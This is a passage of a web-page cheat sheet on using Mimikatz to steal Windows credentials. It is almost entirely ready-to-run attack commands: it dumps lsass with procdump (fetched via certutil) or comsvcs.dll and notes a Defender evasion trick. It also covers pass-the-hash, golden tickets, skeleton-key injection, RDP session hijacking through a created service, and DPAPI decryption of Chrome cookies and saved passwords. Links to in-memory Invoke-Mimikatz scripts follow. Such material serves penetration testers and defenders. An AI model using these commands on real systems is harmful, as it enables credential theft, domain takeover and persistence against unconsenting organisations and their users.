</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log</span>
</span></span></code></pre></div></li></ul><h2 id=mimikatz---mini-dump>Mimikatz - Mini Dump
<a class=anchor href=#mimikatz---mini-dump>#</a></h2><p>Dump the lsass process with <code>procdump</code></p><blockquote><p>Windows Defender is triggered when a memory dump of lsass is operated, quickly leading to the deletion of the dump. Using lsass&rsquo;s process identifier (pid) &ldquo;bypasses&rdquo; that.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># HTTP method - using the default way</span>
</span></span><span style=display:flex><span>certutil -urlcache -split <span style=color:#f92672>-f</span> http<span style=color:#960050;background-color:#1e0010>:</span>//live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
</span></span><span style=display:flex><span>C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># SMB method - using the pid</span>
</span></span><span style=display:flex><span>net use Z: https<span style=color:#960050;background-color:#1e0010>:</span>//live.sysinternals.com
</span></span><span style=display:flex><span>tasklist /fi <span style=color:#e6db74>&#34;imagename eq lsass.exe&#34;</span> <span style=color:#75715e># Find lsass&#39;s pid</span>
</span></span><span style=display:flex><span>Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
</span></span></code></pre></div><p>Dump the lsass process with <code>rundll32</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass_pid C:\temp\lsass.dmp full
</span></span></code></pre></div><p>Then load it inside Mimikatz.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>mimikatz <span style=color:#75715e># sekurlsa::minidump lsass.dmp</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>Switch</span> to minidump
</span></span><span style=display:flex><span>mimikatz <span style=color:#75715e># sekurlsa::logonPasswords</span>
</span></span></code></pre></div><h2 id=mimikatz---pass-the-hash>Mimikatz - Pass The Hash
<a class=anchor href=#mimikatz---pass-the-hash>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>mimikatz <span style=color:#75715e># sekurlsa::pth /user:SCCM$ /domain:IDENTITY /ntlm:e722dfcd077a2b0bbe154a1b42872f4e /run:powershell</span>
</span></span></code></pre></div><h2 id=mimikatz---golden-ticket>Mimikatz - Golden ticket
<a class=anchor href=#mimikatz---golden-ticket>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>.\mimikatz kerberos::golden /admin<span style=color:#960050;background-color:#1e0010>:</span>ADMINACCOUNTNAME /domain<span style=color:#960050;background-color:#1e0010>:</span>DOMAINFQDN /id<span style=color:#960050;background-color:#1e0010>:</span>ACCOUNTRID /sid<span style=color:#960050;background-color:#1e0010>:</span>DOMAINSID /krbtgt<span style=color:#960050;background-color:#1e0010>:</span>KRBTGTPASSWORDHASH /ptt
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>.\mimikatz <span style=color:#e6db74>&#34;kerberos::golden /admin:DarthVader /domain:rd.lab.adsecurity.org /id:9999 /sid:S-1-5-21-135380161-102191138-581311202 /krbtgt:13026055d01f235d67634e109da03321 /startoffset:0 /endin:600 /renewmax:10080 /ptt&#34;</span> exit
</span></span></code></pre></div><h2 id=mimikatz---skeleton-key>Mimikatz - Skeleton key
<a class=anchor href=#mimikatz---skeleton-key>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>privilege::debug
</span></span><span style=display:flex><span>misc::skeleton
</span></span><span style=display:flex><span><span style=color:#75715e># map the share</span>
</span></span><span style=display:flex><span>net use p: \\WIN-PTELU2U07KG\admin$ /user<span style=color:#960050;background-color:#1e0010>:</span>john mimikatz
</span></span><span style=display:flex><span><span style=color:#75715e># login as someone</span>
</span></span><span style=display:flex><span>rdesktop <span style=color:#ae81ff>10.0</span>.0.<span style=color:#ae81ff>2</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>3389</span> -u test -p mimikatz -d pentestlab
</span></span></code></pre></div><h2 id=mimikatz---rdp-session-takeover>Mimikatz - RDP session takeover
<a class=anchor href=#mimikatz---rdp-session-takeover>#</a></h2><p>Use <code>ts::multirdp</code> to patch the RDP service to allow more than two users.</p><p>Run tscon.exe as the SYSTEM user, you can connect to any session without a password.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>privilege::debug 
</span></span><span style=display:flex><span>token::elevate 
</span></span><span style=display:flex><span>ts::remote /id<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>2</span> 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># get the Session ID you want to hijack</span>
</span></span><span style=display:flex><span>query user
</span></span><span style=display:flex><span>create sesshijack binpath= <span style=color:#e6db74>&#34;cmd.exe /k tscon 1 /dest:rdp-tcp#55&#34;</span>
</span></span><span style=display:flex><span>net start sesshijack
</span></span></code></pre></div><h2 id=mimikatz---credential-manager--dpapi>Mimikatz - Credential Manager & DPAPI
<a class=anchor href=#mimikatz---credential-manager--dpapi>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># check the folder to find credentials</span>
</span></span><span style=display:flex><span>dir C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\*
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># check the file with mimikatz</span>
</span></span><span style=display:flex><span>$ mimikatz dpapi::cred /<span style=color:#66d9ef>in</span><span style=color:#960050;background-color:#1e0010>:</span>C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># find master key</span>
</span></span><span style=display:flex><span>$ mimikatz !sekurlsa::dpapi
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># use master key</span>
</span></span><span style=display:flex><span>$ mimikatz dpapi::cred /<span style=color:#66d9ef>in</span><span style=color:#960050;background-color:#1e0010>:</span>C:\Users\&lt;username&gt;\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey<span style=color:#960050;background-color:#1e0010>:</span>95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
</span></span></code></pre></div><h3 id=chrome-cookies--credential>Chrome Cookies & Credential
<a class=anchor href=#chrome-cookies--credential>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># Saved Cookies</span>
</span></span><span style=display:flex><span>dpapi::chrome /<span style=color:#66d9ef>in</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#e6db74>&#34;%localappdata%\Google\Chrome\User Data\Default\Cookies&#34;</span> /unprotect
</span></span><span style=display:flex><span>dpapi::chrome /<span style=color:#66d9ef>in</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#e6db74>&#34;C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies&#34;</span> /masterkey<span style=color:#960050;background-color:#1e0010>:</span>9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Saved Credential in Chrome</span>
</span></span><span style=display:flex><span>dpapi::chrome /<span style=color:#66d9ef>in</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#e6db74>&#34;%localappdata%\Google\Chrome\User Data\Default\Login Data&#34;</span> /unprotect
</span></span></code></pre></div><h3 id=task-scheduled-credentials>Task Scheduled credentials
<a class=anchor href=#task-scheduled-credentials>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>mimikatz(commandline) <span style=color:#75715e># vault::cred /patch</span>
</span></span><span style=display:flex><span>TargetName <span style=color:#960050;background-color:#1e0010>:</span> Domain<span style=color:#960050;background-color:#1e0010>:</span>batch=TaskScheduler<span style=color:#960050;background-color:#1e0010>:</span>Task<span style=color:#960050;background-color:#1e0010>:</span>{CF3ABC3E-4B17-ABCD-<span style=color:#ae81ff>0003</span>-A1BA192CDD0B} / &lt;NULL&gt;
</span></span><span style=display:flex><span>UserName   <span style=color:#960050;background-color:#1e0010>:</span> DOMAIN\user
</span></span><span style=display:flex><span>Comment    <span style=color:#960050;background-color:#1e0010>:</span> &lt;NULL&gt;
</span></span><span style=display:flex><span>Type       <span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>2</span> - domain_password
</span></span><span style=display:flex><span>Persist    <span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>2</span> - local_machine
</span></span><span style=display:flex><span>Flags      <span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>00004004</span>
</span></span><span style=display:flex><span>Credential <span style=color:#960050;background-color:#1e0010>:</span> XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
</span></span><span style=display:flex><span>Attributes <span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>0</span>
</span></span></code></pre></div><h3 id=vault>Vault
<a class=anchor href=#vault>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>vault::cred /<span style=color:#66d9ef>in</span><span style=color:#960050;background-color:#1e0010>:</span>C:\Users\demo\AppData\Local\Microsoft\Vault\<span style=color:#e6db74>&#34;
</span></span></span></code></pre></div><h2 id=mimikatz---commands-list>Mimikatz - Commands list
<a class=anchor href=#mimikatz---commands-list>#</a></h2><table><thead><tr><th style=text-align:center>Command</th><th style=text-align:left>Definition</th></tr></thead><tbody><tr><td style=text-align:center>CRYPTO::Certificates</td><td style=text-align:left>list/export certificates</td></tr><tr><td style=text-align:center>CRYPTO::Certificates</td><td style=text-align:left>list/export certificates</td></tr><tr><td style=text-align:center>KERBEROS::Golden</td><td style=text-align:left>create golden/silver/trust tickets</td></tr><tr><td style=text-align:center>KERBEROS::List</td><td style=text-align:left>list all user tickets (TGT and TGS) in user memory. No special privileges required since it only displays the current user’s tickets.Similar to functionality of “klist”.</td></tr><tr><td style=text-align:center>KERBEROS::PTT</td><td style=text-align:left>pass the ticket. Typically used to inject a stolen or forged Kerberos ticket (golden/silver/trust).</td></tr><tr><td style=text-align:center>LSADUMP::DCSync</td><td style=text-align:left>ask a DC to synchronize an object (get password data for account). No need to run code on DC.</td></tr><tr><td style=text-align:center>LSADUMP::LSA</td><td style=text-align:left>Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use to dump all Active Directory domain credentials from a Domain Controller or lsass.dmp dump file. Also used to get specific account credential such as krbtgt with the parameter /name: “/name:krbtgt”</td></tr><tr><td style=text-align:center>LSADUMP::SAM</td><td style=text-align:left>get the SysKey to decrypt SAM entries (from registry or hive). The SAM option connects to the local Security Account Manager (SAM) database and dumps credentials for local accounts. This is used to dump all local credentials on a Windows computer.</td></tr><tr><td style=text-align:center>LSADUMP::Trust</td><td style=text-align:left>Ask LSA Server to retrieve Trust Auth Information (normal or patch on the fly). Dumps trust keys (passwords) for all associated trusts (domain/forest).</td></tr><tr><td style=text-align:center>MISC::AddSid</td><td style=text-align:left>Add to SIDHistory to user account. The first value is the target account and the second value is the account/group name(s) (or SID). Moved to SID:modify as of May 6th, 2016.</td></tr><tr><td style=text-align:center>MISC::MemSSP</td><td style=text-align:left>Inject a malicious Windows SSP to log locally authenticated credentials.</td></tr><tr><td style=text-align:center>MISC::Skeleton</td><td style=text-align:left>Inject Skeleton Key into LSASS process on Domain Controller. This enables all user authentication to the Skeleton Key patched DC to use a “master password” (aka Skeleton Keys) as well as their usual password.</td></tr><tr><td style=text-align:center>PRIVILEGE::Debug</td><td style=text-align:left>get debug rights (this or Local System rights is required for many Mimikatz commands).</td></tr><tr><td style=text-align:center>SEKURLSA::Ekeys</td><td style=text-align:left>list Kerberos encryption keys</td></tr><tr><td style=text-align:center>SEKURLSA::Kerberos</td><td style=text-align:left>List Kerberos credentials for all authenticated users (including services and computer account)</td></tr><tr><td style=text-align:center>SEKURLSA::Krbtgt</td><td style=text-align:left>get Domain Kerberos service account (KRBTGT)password data</td></tr><tr><td style=text-align:center>SEKURLSA::LogonPasswords</td><td style=text-align:left>lists all available provider credentials. This usually shows recently logged on user and computer credentials.</td></tr><tr><td style=text-align:center>SEKURLSA::Pth</td><td style=text-align:left>Pass- theHash and Over-Pass-the-Hash</td></tr><tr><td style=text-align:center>SEKURLSA::Tickets</td><td style=text-align:left>Lists all available Kerberos tickets for all recently authenticated users, including services running under the context of a user account and the local computer’s AD computer account. Unlike kerberos::list, sekurlsa uses memory reading and is not subject to key export restrictions. sekurlsa can access tickets of others sessions (users).</td></tr><tr><td style=text-align:center>TOKEN::List</td><td style=text-align:left>list all tokens of the system</td></tr><tr><td style=text-align:center>TOKEN::Elevate</td><td style=text-align:left>impersonate a token. Used to elevate permissions to SYSTEM (default) or find a domain admin token on the box</td></tr><tr><td style=text-align:center>TOKEN::Elevate /domainadmin</td><td style=text-align:left>impersonate a token with Domain Admin credentials.</td></tr></tbody></table><h2 id=mimikatz---powershell-version>Mimikatz - Powershell version
<a class=anchor href=#mimikatz---powershell-version>#</a></h2><p>Mimikatz in memory (no binary on disk) with :</p><ul><li><a href=https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1>Invoke-Mimikatz</a> from PowerShellEmpire</li><li><a href=https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1>Invoke-Mimikatz</a> from PowerSploit</li></ul><p>More information can be grabbed from the Memory with :</p><ul><li><a href=https://raw.githubusercontent.com/putterpanda/mimikittenz/master/Invoke-mimikittenz.ps1>Invoke-Mimikittenz</a></li></ul><h2 id=references>References
<a class=anchor href=#references>#</a></h2><ul><li><a href="https://adsecurity.org/?page_id=1821">Unofficial Guide to Mimikatz & Command Reference</a></li><li><a href=https://pentestlab.blog/2018/04/10/skeleton-key/>Skeleton Key</a></li><li><a href=https://www.adamcouch.co.uk/reversing-wdigest-configuration-in-windows-server-2012-r2-and-windows-server-2016/>Reversing Wdigest configuration in Windows Server 2012 R2 and Windows Server 2016 - 5TH DECEMBER 2017 - ACOUCH</a></li></ul></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div><a class="flex align-center" href=https://github.com/m00tiny/grayhatfreelancing/commit/3579e9c4ae7712d4e8fcdd17b931224d3fca8a8d title='Last modified by Stuart Gray | December 10, 2022' target=_blank rel=noopener><img src=/svg/calendar.svg class=book-icon alt=Calendar>
<span>December 10, 2022</span></a></div></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#windows---mimikatz>Windows - Mimikatz</a><ul><li><a href=#mimikatz---execute-commands>Mimikatz - Execute commands</a></li><li><a href=#mimikatz---extract-passwords>Mimikatz - Extract passwords</a></li><li><a href=#mimikatz---lsa-protection-workaround>Mimikatz - LSA Protection Workaround</a></li><li><a href=#mimikatz---mini-dump>Mimikatz - Mini Dump</a></li><li><a href=#mimikatz---pass-the-hash>Mimikatz - Pass The Hash</a></li><li><a href=#mimikatz---golden-ticket>Mimikatz - Golden ticket</a></li><li><a href=#mimikatz---skeleton-key>Mimikatz - Skeleton key</a></li><li><a href=#mimikatz---rdp-session-takeover>Mimikatz - RDP session takeover</a></li><li><a href=#mimikatz---credential-manager--dpapi>Mimikatz - Credential Manager & DPAPI</a><ul><li><a href=#chrome-cookies--credential>Chrome Cookies & Credential</a></li><li><a href=#task-scheduled-credentials>Task Scheduled credentials</a></li><li><a href=#vault>Vault</a></li></ul></li><li><a href=#mimikatz---commands-list>Mimikatz - Commands list</a></li><li><a href=#mimikatz---powershell-version>Mimikatz - Powershell version</a></li><li><a href=#references>References</a></li></ul></li></ul></nav></div></aside></main></body></html>